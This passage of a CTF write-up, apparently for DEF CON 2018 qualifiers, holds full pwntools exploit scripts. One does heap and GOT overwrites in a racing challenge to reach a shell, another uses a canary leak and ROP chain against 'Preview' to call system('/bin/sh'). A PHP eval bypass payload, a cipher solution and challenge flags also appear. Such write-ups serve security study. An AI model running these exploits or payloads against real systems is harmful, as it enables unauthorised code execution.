  r.sendline("2")
  r.recvuntil("pse\n")
  r.sendline(str(option))

def engine():
  r.recvuntil("E: ")
  r.sendline("3")

def transmission(option):
  r.recvuntil("E: ")
  r.sendline("4")
  r.recvuntil("? ")
  r.sendline(str(option))

def modify_tires_w(width):
  r.recvuntil("E: ")
  r.sendline("1")
  r.recvuntil(": ")
  r.sendline("1")
  r.recvuntil(": ")
  r.sendline(str(width))

def modify_tires_a(ratio):
  r.recvuntil("E: ")
  r.sendline("1")
  r.recvuntil(": ")
  r.sendline("2")
  r.recvuntil(": ")
  r.sendline(str(ratio))

def modify_tires_c(radial):
  r.recvuntil("E: ")
  r.sendline("1")
  r.recvuntil(": ")
  r.sendline("3")
  r.recvuntil(": ")
  r.sendline(str(radial))

def modify_tires_d(diameter):
  r.recvuntil("E: ")
  r.sendline("1")
  r.recvuntil(": ")
  r.sendline("4")
  r.recvuntil(": ")
  r.sendline(str(diameter))

def modify_chassis():
  r.recvuntil("E: ")
  r.sendline("2")
  r.recvuntil(": ")
  r.sendline("1")

def modify_engine():
  r.recvuntil("E: ")
  r.sendline("3")

def modify_transmission(gears,ratio,gear):
  r.recvuntil("E: ")
  r.sendline("4")
  r.recvuntil("? ")
  r.sendline(str(gears))
  r.recvuntil("gear ratio for gear " + str(gears) + " is ")
  addr = r.recvuntil(", mo")[:-4]
  r.recvuntil(": ")
  r.sendline(str(ratio))
  r.recvuntil(")")
  r.sendline(str(gear))
  return addr

def buy():
  r.recvuntil("E: ")
  r.sendline("5")

def race():
  r.recvuntil("E: ")
  r.sendline("6")

if __name__ == '__main__':
  print "start"
  tires(0x8000000)
  transmission(1)
  chassis(1)
  engine()
  modify_tires_w(0xffff)
  modify_tires_a(0xffff)
  modify_tires_c(0xffff)
  modify_tires_d(0xffff)
  addr = ""
  for i in xrange(8):
    addr += chr(int(modify_transmission(0xffffffffffffff70+i,0x44,0)))
  heap = u64(addr) - 0xe0
  print "heap =", hex(heap)
  h = -0xa0
  puts_got = 0x603020

  leak = ((puts_got - heap) - 0x90 - 0x10)&0xffffffffffffffff
  addr = ""
  for i in xrange(8):
    addr += chr(int(modify_transmission(leak+i,0x44,0)))
  puts = u64(addr)
  libc.address = puts - libc.symbols["puts"]
  print "libc.address =" , hex(libc.address)
  exit_got = 0x0603060
  magic = libc.address + 0xf1147
  leak = ((exit_got - heap) - 0x90-0x10)&0xffffffffffffffff
  print hex(magic)
  for i in xrange(8):
    modify_transmission(leak+i,ord(p64(magic)[i]),1)
  buy()
  tires(1)
  r.sendline("ls")


  r.interactive()
```
### Say Hi!

You can send anything as the flag !!
`OOO{Happy Mother's Day!!}``

## Guest Chefs

### PHP Eval White-List

- run ``` die("`../flag`"); ```
- `OOO{Fortunately_php_has_some_rock_solid_defense_in_depth_mecanisms,_so-everything_is_fine.}`

### ghettohackers: Throwback

The interval of each '!' is the index of alphabet.

The text is `Anyo!e!howouldsacrificepo!icyforexecu!!onspeedthink!securityisacomm!ditytop!urintoasy!tem!`. First we try to find all letters on '!' and get `nwltisoos`.
We try lots of possible decryptions like XOR, ord(i) - ord('!'), letters reorganization, affine cipher, Atbash cipher, and many classical ciphers but all failed.
Finally, we notice that the place of '!' maybe a hint. We calculate the interval of each '!' and got `[4, 1, 18, 11, 0, 12, 15, 7, 9, 3, 0]`. We think these numbers are the index of alphabet (e.g. `4` is `d`), and write a code to print the answer.



```
ori = 'Anyo!e!howouldsacrificepo!icyforexecu!!onspeedthink!securityisacomm!ditytop!urintoasy!tem!'
sp = ori.split('!')
print repr(''.join(chr(97 + len(s) - 1) for s in sp))
```

### ddtek: Preview

#### reverse

* Use `IDA pro` to decompile the binary.
* At first galance, we cannot get any useful information.
* Use `gdb` and find out that it will mmap a new area for `real program`
* There is a function which will do some xor stuff on `0x602000` and mmap an memory area for it. That is real program
* In `gdb`, you can do this 
`dump binary memory result.bin 0x602000 0x605000`

* Now we have the real program.

#### exploit
1. Use the string "HEAL /proc/self/maps" to get the code address and /lib/x86_64-linux-gnu/ld-2.23.so address
2. canary is combined by code address and /lib/x86_64-linux-gnu/ld-2.23.so address 
3. make the program stack overflow, bypass the canary, and use ROP to get shell

```python=
from pwn import *
import sys
import time
import random
host = 'cee810fa.quals2018.oooverflow.io'
port = 31337

binary = "./preview"
context.binary = binary
elf = ELF(binary)
try:
  libc = ELF("./libc.so.6")
  log.success("libc load success")
  system_off = libc.symbols.system
  log.success("system_off = "+hex(system_off))
except:
  log.failure("libc not found !")


if len(sys.argv) == 1:
  r = process([binary, "0"], env={"LD_LIBRARY_PATH":"."})
  #r = remote("127.0.0.1" ,4444)

else:
  r = remote(host ,port)
  r.recvuntil("Challenge: ")
  Challenge = r.recvuntil("\n")[:-1]
  r.recvuntil("n:")
  n = r.recvuntil("\n")[:-1]
  r.recvuntil("Solution:")
  p = process(["/usr/bin/python", "./pow.py",Challenge ,n ])
  print "pow..."
  p.recvuntil("Solution: ")
  ans = p.recvuntil(" ")[:-1]
  r.sendline(ans)

if __name__ == '__main__':
  print "start"
  r.recvuntil("Standing by for your requests\n")
  r.sendline("HEAD /proc/self/maps\x00" + "A"*0x42)
  r.recvuntil("Here's your preview:\n")
  data = r.recvuntil("\n")
  if "/lib/x86_64-linux-gnu/ld-2" in data:
    ld_addr = data[:data.find("-")]
    r.recvuntil("\n")
    r.recvuntil("\n")
    data = r.recvuntil("\n")
    if "r-xp" in data:
      code = data[:data.find('-')]
    else:
      data = r.recvuntil("\n")
      code = data[:data.find('-')]
  elif "r-xp" in data:
    code = data[:data.find('-')]
    r.recvuntil("\n")
    r.recvuntil("\n")
    data = r.recvuntil("\n")
    ld_addr = data[:data.find("-")]
  ld_addr = int(ld_addr,16)
  code = int(code,16)
  pop_rdi = 0x00000000000010b3 + code
  pop_rsi_1 = 0x00000000000010b1 + code
  puts_got = code + 0x202020
  puts_plt = code + 0x0009E0
  read_plt = code + 0x000A60
  pop_rsp_3 = code + 0x00000000000010ad
  print "code =", hex(code)
  print "ld_addr =" ,hex(ld_addr)
  canary = (code/0x1000 + ld_addr/0x1000 * 0x10000000)*0x100
  print "canary =" , hex(canary)
  raw_input("@")
  r.sendline("A"*88 + p64(canary) +"A"*8+ p64(pop_rdi) + p64(puts_got) + p64(puts_plt)  + p64(pop_rdi) + p64(0) + p64(pop_rsi_1) + p64(code + 0x0202800) + p64(0) + p64(read_plt) + p64(pop_rsp_3) + p64(code + 0x0202800))
  r.recvuntil("Malformed request\n")

  puts = u64(r.recv(6).ljust(8,"\x00"))
  libc.address = puts - libc.symbols['puts']
  print "libc.address =" , hex(libc.address)
  r.sendline("A"*24 + p64(pop_rdi) + p64(code + 0x0202800+0x30) + p64(libc.symbols['system']) + "/bin/sh\x00")

  r.interactive() 
```

